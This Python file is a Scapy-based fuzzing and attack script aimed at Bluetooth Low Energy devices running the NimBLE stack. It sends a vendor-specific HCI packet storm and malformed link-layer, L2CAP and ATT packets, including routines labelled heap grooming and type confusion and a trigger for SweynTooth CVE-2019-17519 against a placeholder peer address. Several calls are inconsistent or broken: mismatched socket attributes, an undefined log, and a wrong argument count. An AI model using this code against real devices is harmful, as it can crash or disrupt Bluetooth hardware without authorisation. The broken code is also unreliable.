from scapy.all import *
from scapy.layers.bluetooth import *
from scapy.layers.bluetooth4LE import *
from nimble_connector import NimBLEConnectionManager
import os
import struct
import time
import random

class NimBLEFuzzer(NimBLEConnectionManager):
    def __init__(self, adapter=0, role='central'):
        super().__init__(adapter, role) 
        self.sniffing = False
        self.crash_signatures = []

    def _start_sniffer(self):
        """Background packet capture for crash detection"""
        def _sniff_callback(pkt):
            if BTLE in pkt:
                self.response_log.append(pkt.summary())
        self.sniffing = True
        AsyncSniffer(iface=self.socket.iface, prn=_sniff_callback, store=False).start()

    def timing_attack(self):
        """Physical layer disruption patterns"""
        # Packet storm (1000 packets/sec)
        start = time.time()
        while time.time() - start < 5:  # 5-second burst
            pkt = (
                HCI_Hdr(type=0)/
                HCI_Command_Hdr(opcode=0xFD01)/  # Vendor-specific
                os.urandom(128)
            )
            self.se(pkt)
            time.sleep(0.001)
        
    def fuzz_link_layer(self, conn):
        """Fuzz link layer packets with selective CRC/whitening bypass."""
        access_addr = conn['access_addr']
        
        # Fuzzed LL control packet with CRC/whitening disabled
        fuzzed_ll = self.fuzz_packet(
            BTLE(access_addr=access_addr)/BTLE_DATA()/LL_CONNECTION_UPDATE_IND(
                win_size=15,
                timeout=100
            ),
            fuzz_fields={'win_size': random.randint(1, 255), 'timeout': random.randint(10, 500)}
        )
        self.ll_send_raw(fuzzed_ll, disable_crc=True, disable_whiten=True) 

    def fuzz_l2cap(self, conn):
        """Fuzz L2CAP layer packets."""
        # Fuzzed L2CAP CID
        bad_cid = int.from_bytes(os.urandom(2), 'big')
        l2cap_pkt = L2CAP_Hdr(cid=bad_cid)/os.urandom(30)
        self.l2cap_send_raw(conn, l2cap_pkt)
        
    def fuzz_att(self, conn):
        """Fuzz ATT layer packets."""
        # Fuzzed ATT Read Request
        fuzzed_att = self.fuzz_packet(
            ATT_Hdr()/ATT_Read_Request(gatt_handle=0x0001),
            fuzz_fields={'gatt_handle': random.randint(0x0001, 0xFFFF)}
        )
        self.att_send_raw(conn, fuzzed_att)


    def l2cap_fragmentation_attack(self, conn):
        """Protocol-aware L2CAP state corruption"""
        # Fragmented packet paradox
        frags = [
            (0x01, L2CAP_Hdr(cid=4, len=1024)/Raw(b'\x00'*64)),  # Start
            (0x00, Raw(b'\x41'*128)),  # Continue
            (0x00, L2CAP_CmdHdr(code=0x04, ident=1)/Raw(b'\xFF'*64)),  # Protocol violation
            (0x02, L2CAP_Hdr(cid=0x0045)/ATT_Error_Response())  # Invalid end
        ]
        
        for pb_flag, payload in frags:
            acl = HCI_Hdr(type=2)/HCI_ACL_Hdr(
                handle=conn['handle'], 
                PB=pb_flag
            )/payload
            self.socket.send(acl) 
            time.sleep(0.005)

    def att_handle_reaper(self, conn):
        """Advanced ATT handle fuzzing with memory probing"""
        # Heap grooming pattern
        for handle in range(0x0000, 0xFFFF, 0x100):
            pkt = ATT_Read_Request(gatt_handle=handle)
            self.sock.send(
                HCI_Hdr(type=2)/HCI_ACL_Hdr(handle=conn['handle'])/
                L2CAP_Hdr(cid=4)/pkt
            )
            time.sleep(0.001)
        
        # Type confusion attack
        for opcode in [0x08, 0x18, 0x28]:  # Write vs Signed Write
            self.sock.send(
                ATT_Hdr(opcode=opcode)/struct.pack('<HH', 
                    random.randint(0, 0xFFFF),  # Handle
                    random.randint(0, 0xFFFF)   # Value
                )
            )

    def sweyntooth_cve_2019_17519(self, conn):
        """Malformed L2CAP Continuation (CVE-2019-17519)"""
        print("[+] Triggering CVE-2019-17519 (L2CAP Fragmentation Attack)")
        # Start with valid L2CAP header
        start_pkt = HCI_Hdr(type=2)/HCI_ACL_Hdr(
            handle=conn['handle'],
            PB=0x01  # Start fragment
        )/L2CAP_Hdr(cid=4, len=1024)/Raw(b'\x00'*64)
        
        # Follow with invalid continuation
        cont_pkt = HCI_Hdr(type=2)/HCI_ACL_Hdr(
            handle=conn['handle'],
            PB=0x00  # Continue fragment
        )/Raw(b'\xFF'*128)  # Invalid payload
        
        self.socket.send(start_pkt)
        time.sleep(0.1)
        self.socket.send(cont_pkt)


def main():
    peer_address = "AA:BB:CC:DD:EE:FF"
    
    with NimBLEFuzzer(adapter=0, role='central') as fuzzer:
        # Initialize and connect
        conn = fuzzer.init_connection(peer_address, "public")
        fuzzer.connect(conn)

        try: 
            # Run fuzzing procedures
            fuzzer.fuzz_link_layer(conn)
            time.sleep(0.5)
            fuzzer.fuzz_l2cap(conn)
            time.sleep(0.5)
            fuzzer.fuzz_att(conn)
            time.sleep(0.5)
            fuzzer.l2cap_fragmentation_attack(conn)
            time.sleep(0.5)
            fuzzer.att_handle_reaper(conn)
            time.sleep(0.5)
            fuzzer.timing_attack(conn)
        finally:
            fuzzer.disconnect(conn)

if __name__ == "__main__":
    main()